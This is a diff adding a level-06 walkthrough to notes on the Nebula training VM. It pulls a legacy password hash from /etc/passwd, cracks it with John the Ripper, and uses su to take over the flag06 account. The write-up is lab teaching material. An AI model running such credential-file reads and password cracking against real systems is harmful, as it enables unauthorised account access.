@@ -5,6 +5,28 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 06
+--------
+
+##### get and use john to crack passwords still in /etc/passwd (old unix systems)
+```bash
+grep flag06 /etc/passwd
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+
+# use john on ueqwOCnSGdsuM or passwd file
+john -show /etc/passwd
+flag06:hello:993:993::/home/flag06:/bin/sh
+```
+
+##### use password for flag06 user and execute getflag
+```bash
+level06@nebula:~$ su - flag06
+Password: # hello
+flag06@nebula:~$ getflag 
+You have successfully executed getflag on a target account
+```
+
+
 level 07
 --------
 
